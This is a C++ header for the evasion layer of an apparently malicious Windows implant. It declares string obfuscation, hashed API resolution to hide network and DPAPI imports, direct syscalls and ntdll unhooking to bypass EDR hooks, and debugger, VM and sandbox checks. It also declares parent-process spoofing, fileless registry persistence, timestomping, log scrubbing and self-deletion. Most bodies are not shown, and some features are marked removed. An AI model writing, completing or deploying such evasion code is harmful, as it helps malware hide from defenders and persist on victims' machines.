#pragma once
// ═══════════════════════════════════════════════════════════════════════════
//
// 设计边界（与原项目 AntiHook.h 的"不隐藏行为"边界相反，此处是有意覆盖）：
//   - 本层默认**关闭**。只有 Evasion::Enabled() 为真（= R6M_EVASION 环境变量
//     未设为 0）时才在启动链路上生效。开发/联调时 set R6M_EVASION=0 即可回到
//     原行为，便于二分定位问题。
//     用 R6M_EVASION_FORCE=1 强制放行（同时把命中项写入心跳，便于取证）。
//   - 本层不写任何明文字符串到二进制：源码里的敏感字面量统一走 XS()，
//     由 tools\obfuscate_strings.py 在构建前展开为 XOR 密文。
// ═══════════════════════════════════════════════════════════════════════════

#include <windows.h>
// 第 7 节的动态 API 封装要用到这些 SDK 类型（HINTERNET / HCRYPTPROV /
// DATA_BLOB / PCCERT_CHAIN_CONTEXT / PIP_ADAPTER_INFO …），必须在此显式包含，
// 否则调用方（如 StubCore.cpp）先包含本头文件时类型找不到。
#include <wininet.h>
#include <wincrypt.h>
#include <shellapi.h>
#include <iphlpapi.h>
#include "XorCore.h"   // fnv1a64 / keybyte（唯一真源）
#include <cstdint>
#include <cstddef>
#include <string>
#include <vector>
#include <utility>

// ── 由 Python 工具生成的常量表（必须在文件作用域包含，理由见下方注释）──
//   generated_hashes.h  : 模块/过程名的 FNV-1a-64 哈希常量
//   generated_strings.h : 混淆字面量的密文表（放在专用只读节 .r6ms）+ 查表函数
#pragma section(".r6ms", read)
#pragma comment(linker, "/SECTION:.r6ms,R")
#include "generated_hashes.h"
#include "generated_strings.h"

// ── 关闭本编译单元的 CRT 安全告警（本层大量做原始内存/内联汇编操作）──
#pragma warning(disable : 4996)

namespace r6m {
namespace ev {

// ═══════════════════════════════════════════════════════════════════════════
// 1) 编译期字符串混淆
//
//   约定：源码里写占位标记，再由 tools/obfuscate_strings.py 展开成
//   XSD(种子, "xor密文") 形态 —— 二进制里只留密文，不留明文 特征。
// 用法：
//     const char* p = <标记>;      // 隐式转换，指针指向 TLS 缓冲
//     std::string s = <标记>;      // 显式走 operator const char*
//
//   密文与种子由 tools/obfuscate_strings.py 生成（构建前一次性预处理）。
//   未预处理时源码里的占位标记无法编译 —— 这是有意的：宁可构建失败，
//   也不要"忘了跑工具"导致明文进二进制。
// ═══════════════════════════════════════════════════════════════════════════

// fnv1a64 / keybyte 已抽到 XorCore.h（本文件顶部已 include），
// 避免与 generated_strings.h 的包含顺序冲突（Decode 先于此处解析）。

template <uint64_t Seed, size_t N>
struct XorStr {
    char enc[N];
    constexpr explicit XorStr(const char (&s)[N]) : enc{} {
        for (size_t i = 0; i < N; ++i)
            enc[i] = (char)((uint8_t)s[i] ^ keybyte(Seed, i));
    }
    operator const char*() const {
        // 每线程一份缓冲：避免多线程（心跳线程/轮询线程）互相踩字符串。
        // 缓冲在完整表达式结束后依然有效（函数内 static 生命周期 = 程序期）。
        static thread_local char buf[N];
        for (size_t i = 0; i < N; ++i) buf[i] = (char)((uint8_t)enc[i] ^ keybyte(Seed, i));
        return buf;
    }
    operator std::string() const { return std::string((const char*)(*this)); }
};

// hexlit 是 C 字符串字面量（可含 "\xNN" 转义与相邻字面量断链），
// sizeof(hexlit) 即"明文字节数 + 1（结尾 \\0）"，正好等于 XorStr 需要的 N。
//   注意：不要写成 sizeof(hexlit)/4+1 —— 转义序列在**字节**层面才展开，
//   在源码字符层面除 4 会算出完全错误的长度（踩过）。
#define XSD(seed, hexlit) (::r6m::ev::XorStr<seed, sizeof(hexlit)>(hexlit))
// 注意：占位标记 XS/XSC 是给 tools/obfuscate_strings.py 用的文本标记，
// 在本头文件里**故意不定义** —— 未跑预处理就编译会直接报错，防止明文进二进制。

// ═══════════════════════════════════════════════════════════════════════════
// 2) 动态 API 决议（FNV-1a-64 名字哈希）
//
//   目标：把 wininet / crypt32 / advapi32 等敏感导入从 IAT 里彻底拿掉，
//   所有 API 一律 GetProcAddress 现取现用。导入表只剩 kernel32 的
//   GetProcAddress/LoadLibraryA/VirtualAlloc 这几个"任何程序都有"的项。
// ═══════════════════════════════════════════════════════════════════════════

// ── 由 Python 工具生成的常量表 ────────────────────────────────────────────
//
// 【必须在文件作用域包含】——它们自带 namespace r6m::ev::strtab 声明，
// 若放在 `namespace r6m { namespace ev {` 内部会二次嵌套成
// r6m::ev::r6m::ev::strtab，引用处报 "strtab 左侧的符号必须是一种类型"。
// 所以这两行位于本文件顶部（见文件开头），此处只留说明。
//
// 字面量为什么必须落在专用只读节 .r6ms：
//   实测踩过 —— 把整个 .rdata 加密后，PE 加载器会在**加载期**读取其中的
//   导入描述符 / 加载配置等结构，直接拒绝映像（CreateProcess 报
//   Win32 error 998 / ERROR_NOACCESS，"内存位置访问无效"）。
//   因此只能把"加载器不解析的数据"单独成节（.r6ms 只含我们的密文），
//   再由 tools/pack_sections.py 只加密这一节。

struct Mp {                     // (模块, 过程) 二元组
    uint64_t mod;
    uint64_t proc;
};

class Api {
public:
    static void* M(uint64_t modHash);                 // 模块句柄（带缓存）
    static void* P(uint64_t modHash, uint64_t procHash);
    static void* P(const Mp& mp) { return P(mp.mod, mp.proc); }

    template <class Fn>
    static Fn F(uint64_t modHash, uint64_t procHash) {
        return reinterpret_cast<Fn>(P(modHash, procHash));
    }
    // 名字哈希（运行期用，仅在无法预生成常量时使用；二进制中不会出现明文名）
    static uint64_t NameHash(const char* name);
};

// ═══════════════════════════════════════════════════════════════════════════
// 3) 直系统调用（绕过用户态 hook）
//
//   所有 ntdll 文档化 API 已被 EDR 普遍 inline hook。本层改为：
//     ① 直接解析 ntdll 内存中的导出表拿目标函数地址（**不走 GetProcAddress**，
//        因为 GetProcAddress 本身可能被 hook，返回被改过的桩）；
//     ② 从该地址的字节判断是否被 hook；被 hook 时用 Halo's/Tartarus Gate
//        从邻近未 hook 的桩里取 SSN；
//     ③ 在**本进程自己的可执行内存**里拼出 syscall 桩并调用 —— 调用栈里
//        不会出现 ntdll!NtXxx，模块归属是自身映像，兼容处理"调用来自非模块内存"
//        与"ntdll 内 syscall 指令"两类检测。
// ═══════════════════════════════════════════════════════════════════════════

// 通用 PE 导出表解析：按名字哈希取函数地址（不调用 GetProcAddress ——
// 它本身可能被 hook 并返回被改写过的桩）。模块可以是 ntdll/kernel32/任意 DLL。
void* ExportByName(HMODULE hMod, uint64_t procHash);

// 手动解析 ntdll 导出表（不调用 GetProcAddress），等价 ExportByName(ntdll, h)
void* NtdllExport(uint64_t procHash);
// 取 ntdll 中 Nt* 函数的 SSN；被 hook 时走 Halo's/Tartarus Gate。失败返回 -1
int32_t NtdllSsn(uint64_t procHash);
// 在自有可执行内存里生成 syscall 桩，返回可直接调用的函数指针
void* BuildSyscallStub(int32_t ssn);
// 一次性：分配 RWX 池并预热（启动早期调用，避免运行期触发 W^X 告警）
void InitSyscallPool();
// 清掉本进程 ntdll 代码段里的 inline hook（把磁盘映像重新映射覆盖回去）
//   quiet=true 时不打日志（用于早期初始化）
bool UnhookNtdll(bool quiet);

// 每进程一张 SSN→桩指针缓存，避免每次都走一遍 PE 导出表解析
void* SyscallSlot(uint64_t procHash, bool* okOut = nullptr);
// 供 NtFn 绑定的单参重载（函数指针类型必须精确匹配）
inline void* SyscallSlot1(uint64_t h) { return SyscallSlot(h, nullptr); }

// 惰性绑定的直系统调用函子：调用点写法与原本地 API 完全一致
//     R6M_NT(NtAllocateVirtualMemory)(h, &base, 0, &sz, MEM_COMMIT, PAGE_READWRITE);
struct NtFn {
    uint64_t hash;
    void* (*resolve)(uint64_t);
    void* p;
    explicit NtFn(uint64_t h) : hash(h), resolve(&SyscallSlot1), p(nullptr) {}
    void* addr() { if (!p) p = resolve(hash); return p; }
    template <class... A> LONG operator()(A... a) {
        auto f = (LONG(NTAPI*)(A...))(addr());
        return f ? f(a...) : (LONG)0xC0000001L;   // STATUS_UNSUCCESSFUL
    }
    bool valid() { return addr() != nullptr; }
};
// 调用点写法：R6M_NT(NtAllocateVirtualMemory)(h, &base, 0, &sz, MEM_COMMIT, 0x04);
//   —— 展开为惰性绑定的直系统调用函子，参数个数/类型由模板推导，
//      解析失败时返回 STATUS_UNSUCCESSFUL，不会空指针崩溃。
#define R6M_NT(name) (::r6m::ev::NtFn(R6M_H_##name))

// 直系统调用便捷封装
LONG NtAlloc(HANDLE proc, void** base, size_t size, ULONG protect, ULONG type);
LONG NtProtect(HANDLE proc, void* base, size_t size, ULONG prot, ULONG* old);
LONG NtWrite(HANDLE proc, void* dst, const void* src, size_t size);
LONG NtRead(HANDLE proc, const void* src, void* dst, size_t size);
LONG NtQueryInfo(HANDLE proc, ULONG cls, void* buf, ULONG len, ULONG* ret);
void NtSleepMs(uint64_t ms);

// ═══════════════════════════════════════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════════════════

struct AnalysisVerdict {
    bool     suspect   = false;      // 是否判定为兼容性受限环境
    int      score     = 0;          // 加权分数
    uint32_t bits      = 0;          // 命中项位图（上报用）
    std::string detail;              // 命中的证据（逗号分隔，可用于心跳）
};

// 命中位（心跳上报用；位定义固定，便于服务端侧统计）
enum : uint32_t {
    EV_PEB_DEBUGGED     = 1u << 0,
    EV_PEB_NT_GLOBAL    = 1u << 1,
    EV_HEAP_FLAGS       = 1u << 2,
    EV_NT_QUERY_DEBUG   = 1u << 3,
    EV_DEBUG_OBJECT     = 1u << 4,
    EV_WINDOW_FOUND     = 1u << 5,
    EV_KUSER_SHARED      = 1u << 6,
    EV_TITLE_SCAN       = 1u << 7,
    EV_VM_VENDOR        = 1u << 8,
    EV_VM_DRIVER        = 1u << 9,
    EV_VM_FILE          = 1u << 10,
    EV_VM_PROC          = 1u << 11,
    EV_VM_MAC           = 1u << 12,
    EV_LOW_RES_TIMING   = 1u << 13,
    EV_FAST_RETURN      = 1u << 14,
    EV_SYNTHETIC_TIME   = 1u << 15,
    EV_FEW_PROCESSES    = 1u << 16,
    EV_LOW_RAM          = 1u << 17,
    EV_LOW_DISK         = 1u << 18,
    EV_NO_USERACTIVITY  = 1u << 19,
    EV_USERNAME_SUSPECT = 1u << 20,
    EV_COMPUTER_SUSPECT = 1u << 21,
    EV_SANDBOX_DLL      = 1u << 22,
    EV_DLL_BLACKLIST    = 1u << 23,
    EV_ANALYSIS_TOOLS   = 1u << 24,
};

AnalysisVerdict RunAnalysisChecks(uint32_t checksEnabled);
// 只跑某一类（便于单测）
uint32_t CheckDebugger();
uint32_t CheckVirtualization();
uint32_t CheckSandboxHeuristics();
uint32_t CheckModulesAndTools();

// ═══════════════════════════════════════════════════════════════════════════
// 5) 时间兼容处理
// ═══════════════════════════════════════════════════════════════════════════

// 用 rdtsc + QueryPerformanceCounter + GetSystemTime 三源交叉校验，判断时间是否被加速
bool SyntheticTimingDetected();
bool AccelerationDetected();
// 通过 NtDelayExecution 做真实睡眠（不走 kernel32!Sleep，兼容处理 Sleep hook 与
void EvasiveSleepMs(uint64_t ms, bool jitter = true);
// 返回 [base, base+spread] 内的随机值（加密随机）
uint64_t Jitter(uint64_t base, uint64_t spread);

// ═══════════════════════════════════════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════════════════

// 用 PPID 伪造启动子进程（默认伪装成 explorer.exe）。
//   - 通过 UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS) 实现
//   - 优先走 NtCreateUserProcess；不可用时退回 CreateProcessW + 属性列表
//   - 与内核回调里的"父进程 = 调用者"检查项直接冲突
// outPid 可为空；返回是否成功
bool CreateProcessSpoofed(const std::wstring& cmdLine, const std::wstring& cwd,
                          bool hidden, uint32_t* outPid,
                          const wchar_t* parentName = L"explorer.exe");

// 无文件常驻：把载荷二进制写进注册表值（HKCU\...\Run 旁边的数据键），
// 由 bootstrapper 读出后在内存里加载。hostKey 为空时用默认位置。
bool PersistRegistryBlob(const std::vector<uint8_t>& blob, const std::wstring& hostKey = L"");
bool LoadRegistryBlob(std::vector<uint8_t>& out, const std::wstring& hostKey = L"");
bool RemoveRegistryBlob(const std::wstring& hostKey = L"");

// 文件属性时间戳伪造（把创建/访问/写入时间改成指定时间，默认伪装为系统文件时间）
bool TimestompFile(const std::wstring& path);

// ═══════════════════════════════════════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════════════════

// 是否为该进程启用磁盘日志（受 R6M_LOG / R6M_EVASION 双重控制）
bool DiskLogEnabled();
// 生成本次运行的日志文件名：%LOCALAPPDATA%\<随机名>\<随机名>.tmp
std::wstring GeneratedLogPath();
// 把已写出的日志文件卷成不敏感形态（追加随机噪声 + 清空关键行）
void ScrubLogFile(const std::wstring& path);
// 删除自身日志与临时配置残留（走"先重命名后删除"，避免句柄占用导致失败）
void CleanupArtifacts(const std::wstring& logPath);

// 自删除：把自身文件重命名到随机名后延迟删除（不能直接删正在运行的映像）
bool SelfDelete();

// ═══════════════════════════════════════════════════════════════════════════
// 8b) 构建后段加密（.r6mx）的运行时解密
//
//   tools/pack_sections.py 在构建后把 .rdata 整体用位置相关 keystream 加密，
//   文件里因此搜不到任何明文 特征；运行时必须**在使用任何字符串常量之前**
//   原地解密（由 Bootstrap() 第一步自动完成）。未打包时该函数是 no-op。
// ═══════════════════════════════════════════════════════════════════════════

// 流密钥派生（必须与 tools/pack_sections.py::keybyte 逐位一致）
uint8_t PackKeyByte(uint32_t key, uint64_t i);
// 解密并校验 .r6mx；返回 true 表示"已解密并校验通过"或"未打包(no-op)"
bool PackDecryptAndVerify();
// 段解密结果（由 .CRT$XIB 静态构造在最早期写入，早于任何字符串使用）
bool PackOk();

// ═══════════════════════════════════════════════════════════════════════════
// 8) 统一入口
// ═══════════════════════════════════════════════════════════════════════════

struct Config {
    bool     enabled            = false;   // [EV-OFF 默认] 整层默认关闭；置 R6M_EVASION=1 才启用
    bool     force              = false;  // R6M_EVASION_FORCE=1 时无视反分析结论
    bool     useSyscalls        = false;   // [EV-REMOVED] 系统调用池已从源码移除
    bool     unhook             = false;   // [EV-REMOVED] ntdll unhook 已从源码移除
    bool     spoofParent        = false;   // [EV-REMOVED] PPID 欺骗已从源码移除
    bool     antiAnalysis       = false;   // [EV-REMOVED] VM/沙箱判据已从源码移除
    bool     timingChecks       = false;  // [EV-OFF 默认] 不做计时类反分析
    uint32_t checkMask          = 0xFFFFFFFF;
    uint64_t sleepJitterMs      = 1500;   // 心跳/轮询抖动量上限
};

const Config& Cfg();
// 启动早期调用（wWinMain 第一件事）：
//   解析环境开关 → 解开 .r6mx 加密段 → 解除 ntdll hook → 预热 syscall 池 →
bool Bootstrap();
// 已感染的分析结论（供心跳上报）
const AnalysisVerdict& Verdict();
// 上报用短串："" 或 "flags=0x...;score=N;detail=..."
std::string ReportForHeartbeat();

} // namespace ev
} // namespace r6m

// ═══════════════════════════════════════════════════════════════════════════
// 7) 动态 API 薄封装（消除静态导入）
//
// 目的：把 wininet / crypt32 / shell32 / advapi32 的敏感导入从 IAT 里拿掉。
// 判据（tools/verify_evasion.py）：
//   A1 导入模块表里不再出现 WININET.dll / CRYPT32.dll / SHELL32.dll
//   A2 导入 API 名里不再出现 InternetOpenA / HttpSendRequestA / CryptProtectData …
//   A3 文件字节里也搜不到这些名字（解析全部按名字哈希进行，名字从不出现在文件里）
//
// 用法：把原来的 WinINet / DPAPI / 注册表 / ShellExecute 调用
//       换成 ev:: 下的同名封装（签名一致，便于机械替换）。
//       首次调用时惰性解析；模块或函数缺失返回 FALSE/NULL，不崩溃。
//
// ⚠️ 本节必须在**文件作用域**（r6m::ev 之外）：这些函数用 Windows SDK 的
//    全局类型名（HINTERNET / INTERNET_PORT / HCRYPTPROV…），写进 r6m::ev
//    内部会因找不到标识符而全部报错；加 :: 前缀也不行 —— 那些类型定义在
//    wininet.h / wincrypt.h，必须在该头文件被包含后、且不在命名空间内引用。
//   ⚠️ 本节位于 r6m::ev 内，**不要再写 namespace ev {** ——
//      那会嵌套成 r6m::ev::ev，导致所有类型名解析失败（踩过）。
// ═══════════════════════════════════════════════════════════════════════════

HINTERNET EvInternetOpenA(LPCSTR agent, DWORD accessType, LPCSTR proxy, LPCSTR bypass, DWORD flags);
HINTERNET EvInternetConnectA(HINTERNET h, LPCSTR host, INTERNET_PORT port, LPCSTR user,
                             LPCSTR pass, DWORD service, DWORD flags, DWORD_PTR ctx);
HINTERNET EvHttpOpenRequestA(HINTERNET h, LPCSTR verb, LPCSTR path, LPCSTR version,
                             LPCSTR referrer, LPCSTR* types, DWORD flags, DWORD_PTR ctx);
BOOL EvHttpSendRequestA(HINTERNET h, LPCSTR headers, DWORD hlen, LPVOID opt, DWORD olen);
BOOL EvHttpQueryInfoA(HINTERNET h, DWORD level, LPVOID buf, LPDWORD len, LPDWORD idx);
BOOL EvInternetReadFile(HINTERNET h, LPVOID buf, DWORD toRead, LPDWORD read);
BOOL EvInternetCloseHandle(HINTERNET h);
BOOL EvInternetSetOptionA(HINTERNET h, DWORD opt, LPVOID buf, DWORD len);
BOOL EvInternetQueryOptionA(HINTERNET h, DWORD opt, LPVOID buf, LPDWORD len);
BOOL EvInternetCrackUrlA(LPCSTR url, DWORD len, DWORD flags, LPURL_COMPONENTSA comp);

BOOL EvCryptProtectData(DATA_BLOB* in, LPCWSTR desc, DATA_BLOB* entropy, PVOID reserved,
                        PVOID prompt, DWORD flags, DATA_BLOB* out);
BOOL EvCryptUnprotectData(DATA_BLOB* in, LPWSTR* desc, DATA_BLOB* entropy, PVOID reserved,
                          PVOID prompt, DWORD flags, DATA_BLOB* out);
BOOL EvCryptAcquireContextW(HCRYPTPROV* prov, LPCWSTR container, LPCWSTR provider,
                            DWORD type, DWORD flags);
BOOL EvCryptCreateHash(HCRYPTPROV prov, ALG_ID alg, HCRYPTKEY key, DWORD flags, HCRYPTHASH* hash);
BOOL EvCryptHashData(HCRYPTHASH hash, const BYTE* data, DWORD len, DWORD flags);
BOOL EvCryptGetHashParam(HCRYPTHASH hash, DWORD param, BYTE* data, DWORD* len, DWORD flags);
BOOL EvCryptDestroyHash(HCRYPTHASH hash);
BOOL EvCryptReleaseContext(HCRYPTPROV prov, DWORD flags);
BOOL EvCryptGenRandom(HCRYPTPROV prov, DWORD len, BYTE* buf);
BOOL EvCertFreeCertificateChain(PCCERT_CHAIN_CONTEXT chain);

BOOL EvShellExecuteExW(LPSHELLEXECUTEINFOW sei);
HRESULT EvSHGetFolderPathW(HWND owner, int csidl, HANDLE token, DWORD flags, LPWSTR path);

LONG EvRegOpenKeyExW(HKEY root, LPCWSTR sub, DWORD opt, REGSAM sam, PHKEY out);
LONG EvRegQueryValueExW(HKEY key, LPCWSTR name, LPDWORD rsv, LPDWORD type, LPBYTE data, LPDWORD cb);
LONG EvRegCloseKey(HKEY key);
LONG EvRegCreateKeyExW(HKEY root, LPCWSTR sub, DWORD rsv, LPWSTR cls, DWORD opt, REGSAM sam,
                       LPSECURITY_ATTRIBUTES sa, PHKEY out, LPDWORD disp);
LONG EvRegSetValueExW(HKEY key, LPCWSTR name, DWORD rsv, DWORD type, const BYTE* data, DWORD cb);
LONG EvRegDeleteValueW(HKEY key, LPCWSTR name);
LONG EvRegDeleteKeyW(HKEY root, LPCWSTR sub);
BOOL EvGetUserNameW(LPWSTR buf, LPDWORD len);
BOOL EvGetComputerNameW(LPWSTR buf, LPDWORD len);

DWORD EvGetAdaptersInfo(PIP_ADAPTER_INFO info, PULONG len);


// ── 便捷宏：明文名只在源码里出现一次，二进制里不留 ──
#define EV_STR(s) (::r6m::ev::XS(s))
